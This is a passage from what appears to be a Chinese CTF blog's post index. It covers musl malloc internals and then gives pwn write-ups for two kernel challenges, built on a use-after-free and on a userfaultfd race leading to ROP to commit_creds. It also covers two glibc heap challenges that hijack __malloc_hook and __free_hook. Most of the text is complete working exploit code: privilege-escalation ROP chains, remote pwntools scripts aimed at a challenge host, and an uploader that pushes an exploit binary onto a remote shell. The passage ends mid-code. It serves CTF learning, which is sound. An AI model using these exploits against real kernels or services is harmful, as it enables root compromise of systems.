...&#125;\n\n可以看到我们如果想要进入dequeue需要进入if判断，并且内部还有个assert，我们需要绕过这两项。\n再关注一下meta结构\nstruct meta &#123;\tstruct meta *prev, *next;\tstruct group *mem;\tvolatile int avail_mask, freed_mask;\tuintptr_t last_idx:5;\tuintptr_t freeable:1;\tuintptr_t sizeclass:6;\tuintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n首先看if判断的第一个内容，我们先看一下在exp当中构造的meta的最后是什么形式表现的\n\n可以看到这里的avail_mask和freed_mask的或值是2等号左半边的值即为3，再看last_idx那么有半边也为3了，就轻松绕过了。再看后面的那个函数\nstatic int okay_to_free(struct meta *g)&#123;\tint sc = g-&gt;sizeclass;\tif (!g-&gt;freeable) return 0;\t// always free individual mmaps not suitable for reuse\tif (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])\t\treturn 1;\t// always free groups allocated inside another group&#x27;s slot\t// since recreating them should not be expensive and they\t// might be blocking freeing of a much larger group.\tif (!g-&gt;maplen) return 1;\t// if there is another non-full group, free this one to\t// consolidate future allocations, reduce fragmentation.\tif (g-&gt;next != g) return 1;\t// free any group in a size class that&#x27;s not bouncing\tif (!is_bouncing(sc)) return 1;\tsize_t cnt = g-&gt;last_idx+1;\tsize_t usage = ctx.usage_by_class[sc];\t// if usage is high enough that a larger count should be\t// used, free the low-count group so a new one will be made.\tif (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)\t\treturn 1;\t// otherwise, keep the last group in a bouncing class.\treturn 0;&#125;\n\n我们只需要返回的结果不为0即可，所以对照上面的图片即可看到很轻松也是可以绕过的，最后则是里面的assert的不大于48，也是很简单就绕过了。但是在实验期间发现了一个新的检测，我把maplen删掉了之后出现了崩溃的情况，查看源码发现，maplen =0 表示group 不是新mmap 出来的在size_classes里，meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间。\nstatic struct mapinfo free_group(struct meta *g)&#123;\tstruct mapinfo mi = &#123; 0 &#125;;\tint sc = g-&gt;sizeclass;\tif (sc &lt; 48) &#123;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\t&#125;\tif (g-&gt;maplen) &#123;\t\tstep_seq();\t\trecord_seq(sc);\t\tmi.base = g-&gt;mem;\t\tmi.len = g-&gt;maplen*4096UL;\t&#125; else &#123;\t\tvoid *p = g-&gt;mem;\t\tstruct meta *m = get_meta(p);\t\tint idx = get_slot_index(p);\t\tg-&gt;mem-&gt;meta = 0;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\t\tmi = nontrivial_free(m, idx);\t&#125;\tfree_meta(g);\treturn mi;&#125;\n\n源码这里也验证了，如果置为0就会进一步进行free，在get_meta就可会出现崩溃。其实在get_meta函数内存在很多assert都可以看一下，这里就不过多赘述了。\n\n参考链接：\nhttps://xz.aliyun.com/t/10326\nhttps://eqqie.cn/\n","categories":["pwn"],"tags":["musl"]},{"title":"practice Ⅱ","url":"/2022/10/19/practice2/","content":"Kernel pwn1题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开始一直在往复杂的想去了\n吐槽一下：为什么cpio格式的要用img结尾我挂载了很久挂载不上，知道file一看发现是cpio格式\n题目分析int __fastcall test1_open(inode *inode, file *filp)&#123;  char *v2; // rax  int result; // eax  ((void (__fastcall *)(inode *, file *))_fentry__)(inode, filp);  v2 = (char *)kmem_cache_alloc_trace(kmalloc_caches[5], 0x24000C0LL, 0x20LL);  length = 0x20;  test1_buffer = v2;  result = 0;  used = 0;  return result;&#125;\n\nint __fastcall test1_release(inode *inode, file *filp)&#123;  _fentry__();  if ( test1_buffer )    kfree(test1_buffer, filp);  return 0;&#125;\n\n这里的漏洞点出在这个UAF上面（开始我还一直在找堆溢出）。因为没注意到在启动脚本中是没有开启kaslr的所以我在用tty_struct，sk_buff这些东西来泄漏基地址，然后泄漏栈地址完成栈迁移。但是发现这些结构体的文件都无法打开，然后仔细一看启动脚本发现并没有开启地址随机化，所以直接开搞就行。\n利用分析这里只需要seq_operations结构体即可，modify_ldt利用 这篇文章中提到过这个结构体的使用，可以去看一下这里就不再赘述了。\n题目比较简单直接放exp了\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int seq_fd;unsigned long pop_rdi = 0xffffffff811cef9d;unsigned long init_cred = 0xffffffff81e497c0;unsigned long commit_creds = 0xffffffff810a1910;unsigned long swapgs = 0xffffffff81063844;unsigned long iretq = 0xffffffff81841297;unsigned long ret = 0xffffffff8100006f;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    char *buf = malloc(0x2000);    unsigned long *pointer_buf = malloc(0x2000);    int fd = open(&quot;/dev/test1&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open test1 error!&quot;);        exit(0);    &#125;    int fd1 = open(&quot;/dev/test1&quot;, O_RDWR);    if (fd1 &lt; 0)    &#123;        puts(&quot;[*]open test1 error!&quot;);        exit(0);    &#125;    write(fd1, buf, 0x20);    close(fd1);    read(fd, buf, 0x20);    seq_fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);    if (seq_fd &lt; 0)    &#123;        errExit(&quot;failed to create stat!&quot;);    &#125;    pointer_buf[0] = 0xffffffff81542a59;    write(fd, pointer_buf, 0x20);    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   commit_creds\\n&quot;        &quot;mov r13,   init_cred\\n&quot;        &quot;mov r12,   pop_rdi\\n&quot;        &quot;mov rbp,   ret\\n&quot;        &quot;mov rbx,   swapgs\\n&quot;        &quot;mov r11,   iretq\\n&quot;        &quot;mov r10,   iretq\\n&quot;        &quot;mov r9,    0xbeefdead\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    return 0;&#125;\n\n然后我之前的上传脚本有点问题，所以修改了一下，这里放一下以后方便拿\nfrom pwn import *from sys import argvr = remote(&#x27;nc.eonew.cn&#x27;, 10101)context.log_level = &#x27;debug&#x27;def send_file(name, sym):    file = read(name)    f = b64e(file)    for i in range(100, 1500):        if len(f) % (1500-i) == 0:            break    size = i    print(len(f))    r.sendlineafter(sym, &quot;cd /tmp&quot;)    r.sendlineafter(sym, &quot;rm *&quot;)    for i in range(len(f) // size + 1):        log.info(&quot;Sending chunk &#123;&#125;/&#123;&#125;&quot;.format(i, len(f)//size))        r.sendlineafter(            sym, &quot;echo -n &#x27;&#123;&#125;&#x27;&gt;&gt;/tmp/exp.gz.b64&quot;.format(f[i*967:(i*967)+967]))    r.sendlineafter(sym, &quot;cat /tmp/exp.gz.b64 | base64 -d &gt;/tmp/exp.gz&quot;)    r.sendlineafter(sym, &quot;gzip -d /tmp/exp.gz&quot;)    r.sendlineafter(sym, &quot;chmod +x /tmp/exp&quot;)def exploit():    sym = &quot;$&quot;    if len(argv) == 2:        if argv[1] == &quot;root&quot;:            sym = &quot;#&quot;        elif argv[1] == &quot;user&quot;:            sym = &quot;$&quot;        else:            print(&quot;user or root?&quot;)            exit()    os.system(&#x27;rm exp.gz&#x27;)    os.system(&#x27;cp ./exp ./exp.bak&#x27;)    os.system(&#x27;gzip ./exp&#x27;)    os.system(&#x27;mv exp.bak exp&#x27;)    send_file(&quot;exp.gz&quot;, sym=sym)    r.interactive()if __name__ == &quot;__main__&quot;:    exploit()\n\nfog一道比较简单的堆题，不过需要利用一点特性，恰好是我以往不知道的特性。\nfast bin合并机制if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        &#123;          bck = victim-&gt;bk;\t  if (__glibc_unlikely (bck-&gt;fd != victim))\t    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;          if (av != &amp;main_arena)\t    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE\t  /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */\t  size_t tc_idx = csize2tidx (nb);\t  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t    &#123;\t      mchunkptr tc_victim;\t      /* While bin not empty and tcache not full, copy chunks over.  */\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\t\t&#123;\t\t  if (tc_victim != 0)\t\t    &#123;\t\t      bck = tc_victim-&gt;bk;\t\t      set_inuse_bit_at_offset (tc_victim, nb);\t\t      if (av != &amp;main_arena)\t\t\tset_non_main_arena (tc_victim);\t\t      bin-&gt;bk = bck;\t\t      bck-&gt;fd = bin;\t\t      tcache_put (tc_victim, tc_idx);\t            &#125;\t\t&#125;\t    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;  /*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   */  else    &#123;      idx = largebin_index (nb);      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))        malloc_consolidate (av);    &#125;\n\n在_int_malloc中存在一个我一直没有注意过的细节，可以看到如果我们malloc的size大于smallbin的size就会进行malloc_consolidate，也就是如果size位large bin范围就会进入合并。并且这一个特性在高版本的libc中也同样存在。\n题目分析这里题目比较简单，就是普通的菜单题\n__int64 __fastcall sub_B1B(void *a1, int a2)&#123;  __int64 result; // rax  LODWORD(result) = read(0, a1, a2);  *((_BYTE *)a1 + (int)result) = 0;  return (unsigned int)result;&#125;\n\n分析发现这个函数存在off by null漏洞，在create和edit中都有调用。这里还需要了解有另外两点，一是在进行fopen时会产生一个size位0x230的chunk \nFILE *__fopen_internal (const char *filename, const char *mode, int is32)&#123;  struct locked_FILE  &#123;    struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif    struct _IO_wide_data wd;  &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  if (new_f == NULL)    return NULL;#ifdef _IO_MTSAFE_IO  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;  _IO_new_file_init_internal (&amp;new_f-&gt;fp);  if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);  _IO_un_link (&amp;new_f-&gt;fp);  free (new_f);  return NULL;&#125;\n\n并且在close这里会free掉，还有就是在printf时会产生一个size位large bin范围的chunk，不过这一点我确实没找到相应源码，有师傅知道可以留言一下，并且我在自己写一个测试脚本时也没有产生，但是调试题目时发现确实存在一个size位0x410的chunk。\n知道了上面的内容就很简单了，使用堆合并得到UAF的堆块，随后劫持__malloc_hook位one_gadget即可getshell\n综上，expfrom pwn import *elf = ELF(&#x27;./fog&#x27;)# r = process(&#x27;./fog&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10006)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(data_size, data=b&#x27;\\n&#x27;):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;What size do you want?&#x27;)    r.sendline(bytes(str(data_size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(data)def delete(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which one do you want to delete?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, data):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which one do you want to modify?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;What do you want to input?&#x27;)    r.send(data)def show(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Which one do you want to see?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x68)  # 0create(0x68)  # 1create(0x68)  # 2create(0x68)  # 3create(0x68)  # 4create(0x68)  # 5create(0x68)  # 6create(0x68)  # 7create(0x68)  # 8create(0x68)  # 9create(0x68)  # 10create(0x68)  # 11create(0x68)  # 12create(0x68, b&#x27;\\x00&#x27;*0x30+flat(0, 0x31))  # 13create(0x68)  # 14for i in range(5):    delete(i)delete(13)delete(12)delete(11)delete(10)delete(9)show(5)r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;5&#x27;)edit(8, b&#x27;a&#x27;*0x60+p64(0x3f0))r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;6&#x27;)create(0x68)  # 0create(0x68)  # 1create(0x68)  # 2create(0x68)  # 3create(0x68)  # 4show(5)r.recvuntil(b&#x27;Content : &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x3c4b78+0x29000print(hex(libc_base))create(0x68)  # 9delete(5)edit(9, p64(libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]-0x23))create(0x68)  # 5create(0x68, b&#x27;\\x00&#x27;*0x13+p64(0x3f42a+libc_base))  # 10print(hex(libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]))print(hex(0x3f42a+libc_base))# gdb.attach(r, &#x27;b*$rebase(0xC5D)&#x27;)r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;1&#x27;)# gdb.attach(r,&#x27;b*$rebase(0xC5D)&#x27;)r.interactive()\n\nTime heap题目非常简单，存在很明显的UAF，这里就不再分析了，直接给exp\nfrom pwn import *elf = ELF(&#x27;./time_heap&#x27;)# r = process(&#x27;./time_heap&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10015)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, contents, remark):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(contents)    r.recvuntil(b&#x27;Remark: &#x27;)    r.send(remark)def delete(idx):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, contents, remark):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(contents)    r.recvuntil(b&#x27;Remark: &#x27;)    r.send(remark)def show(idx):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x400, b&#x27;\\n&#x27;, b&#x27;\\n&#x27;)for i in range(7):    delete(0)    edit(0, flat([0]*2), b&#x27;\\n&#x27;)delete(0)show(0)r.recvuntil(&quot;Content: &quot;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x1ecbe0+0x30000print(hex(libc_base))# gdb.attach(r)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]edit(0, p64(free_hook), flat(0))create(0x400, b&#x27;/bin/sh\\x00&#x27;, flat(system))print(hex(free_hook))delete(1)# gdb.attach(r)r.interactive()\n\nkernel pwn2题目比较简单，就是普通的内核栈题\n题目分析__int64 __fastcall test2_write(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 size; // rdx  char *v4; // r12  __int64 v5; // rbx  __int64 result; // rax  __int64 v7; // rbx  char *v8; // r12  _fentry__(a1, a2, a3);  if ( (unsigned __int64)((int)used + size) &lt;= 0x100 )  &#123;    v7 = size;    msleep(2000LL);    v8 = (char *)&amp;test2_buffer + (int)used;    _check_object_size(v8, v7, 0LL);    copy_from_user(v8, a2, v7);    result = v7;    LODWORD(used) = v7 + used;  &#125;  else  &#123;    v4 = (char *)&amp;test2_buffer + (int)used;    v5 = 0x100 - (int)used;    _check_object_size(v4, v5, 0LL);    copy_from_user(v4, a2, v5);    result = v5;    LODWORD(used) = 0x100;  &#125;  return result;&#125;\n\n__int64 __fastcall test2_read(__int64 a1, __int64 a2)&#123;  unsigned __int64 size; // rdx  unsigned __int64 v3; // rbx  ((void (*)(void))_fentry__)();  v3 = 0LL;  if ( (int)used &lt;= size )  &#123;    if ( (int)used &gt; 0 )      return ((__int64 (__fastcall *)(__int64))get_buf)(a2);  &#125;  else if ( (int)used &gt; 0 )  &#123;    v3 = size;    LODWORD(used) = used - size;    if ( size &gt; 0x100 )    &#123;      _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;, 0x100LL);      BUG();    &#125;    _check_object_size(&amp;test2_buffer, size, 1LL);    copy_to_user(a2, &amp;test2_buffer, v3);  &#125;  return v3;&#125;\n\n__int64 __fastcall get_buf(__int64 a1, __int64 a2)&#123;  __int64 v2; // rbp  __int64 result; // rax  _QWORD v4[36]; // [rsp-120h] [rbp-120h] BYREF  _fentry__();  v4[35] = v2;  v4[32] = __readgsqword(0x28u);  if ( (unsigned __int64)(int)used &gt; 0x200 )  &#123;    fortify_panic(&quot;memcpy&quot;);    return test2_read((__int64)&quot;memcpy&quot;, a2);  &#125;  else  &#123;    memcpy(v4, &amp;test2_buffer, (int)used);    msleep(2000LL);    copy_to_user(a1, v4, used);    result = (int)used;    LODWORD(used) = 0;  &#125;  return result;&#125;\n\n这就是驱动比较重要的三个函数。\n在get_buf函数中会将全局变量的内容复制到栈上，然后再将栈上的内容发送给用户态。从头到尾其实看不出来什么问题，不过题目这里用msleep函数就已经算是明示存在条件竞争了。\n利用分析如果我们可以在get_buf中memcpy之后以及copy_to_user之前就可以泄漏出栈上的内容。\n具体的办法就是两个线程分别write并且分别进入if内的代码块和else内的代码块，首先在memcpy执行之前进入else的代码块修改used的为0x100，随后在copy_to_user之前执行完if内的代码块，那么此时used为0x100+size，所以此时可以泄漏出canary和kernel基地址了。\n有了上面泄漏的思路之后实现栈溢出也就很简单了这里就不提了\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        errExit(&quot;[-] pthread_create&quot;);&#125;void *sleep_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] sleep handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] sleep handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(4);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        // *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] sleep handler done&quot;);        return NULL;    &#125;&#125;unsigned long prepare_kernel_cred = NULL;unsigned long commit_creds = NULL;unsigned long pop_rdi = 0xffffffff810835c0;unsigned long swapgs_pop = 0xffffffff8106c984;unsigned long iretq = 0xffffffff81c014f5;unsigned long init_cred = NULL;unsigned long canary;void *overflow_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] sleep handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] sleep handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(4);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        // *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] sleep handler done&quot;);        return NULL;    &#125;&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int fd;int write_handler(char *buf)&#123;    sleep(2);    puts(&quot;now change uesed&quot;);    write(fd, buf, 0x200);&#125;int control_handler(char *buf)&#123;    write(fd, buf, 0xf0);&#125;int read_handler(char *buf)&#123;    sleep(1);    puts(&quot;now read buffer&quot;);    read(fd, buf, 0x200);&#125;int main()&#123;    save_status();    signal(SIGSEGV, get_shell);    setvbuf(stdout, 2, 0, 0);    fd = open(&quot;/dev/test2&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        puts(&quot;[-] open test2 error!&quot;);    &#125;    char *buf = malloc(0x2000);    char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    char *page2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    pthread_t thr[2];    unsigned long kernel_addr;    unsigned long kernel_base;    unsigned long kernel_offset;    RegisterUserfault(page, sleep_handle);    write(fd, buf, 0x8);    sleep(2);    // read_handler(buf);    pthread_create(&amp;thr[1], NULL, write_handler, buf);    pthread_create(&amp;thr[0], NULL, control_handler, buf);    // write(fd, page, 0xf0);    read_handler(buf);    // pthread_join(thr[0], NULL);    pthread_join(thr[1], NULL);    canary = *(unsigned long *)(buf + 32 * 8);    kernel_addr = *(unsigned long *)(buf + 47 * 8);    kernel_base = kernel_addr - 0x426939;    kernel_offset = kernel_base - 0xffffffff81000000;    printf(&quot;[+] get canary: %p\\n&quot;, canary);    printf(&quot;[+] get kernel base: %p\\n&quot;, kernel_base);    prepare_kernel_cred = 0xb9550 + kernel_base;    commit_creds = 0xb91e0 + kernel_base;    init_cred = 0x165b400 + kernel_base;    swapgs_pop = swapgs_pop + kernel_offset;    iretq = iretq + kernel_offset;    pop_rdi = pop_rdi + kernel_offset;    // RegisterUserfault(page2, overflow_handle);    pthread_create(&amp;thr[0], NULL, write_handler, buf);    sleep(1);    int i = 0;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = pop_rdi;    *(unsigned long *)(buf + ((i++) * 8)) = init_cred;    *(unsigned long *)(buf + ((i++) * 8)) = commit_creds;    *(unsigned long *)(buf + ((i++) * 8)) = swapgs_pop;    *(unsigned long *)(buf + ((i++) * 8)) = swapgs_pop;    *(unsigned long *)(buf + ((i++) * 8)) = iretq;    *(unsigned long *)(buf + ((i++) * 8)) = get_shell;    *(unsigned long *)(buf + ((i++) * 8)) = user_cs;    *(unsigned long *)(buf + ((i++) * 8)) = user_rflags;    *(unsigned long *)(buf + ((i++) * 8)) = user_sp;    *(unsigned long *)(buf + 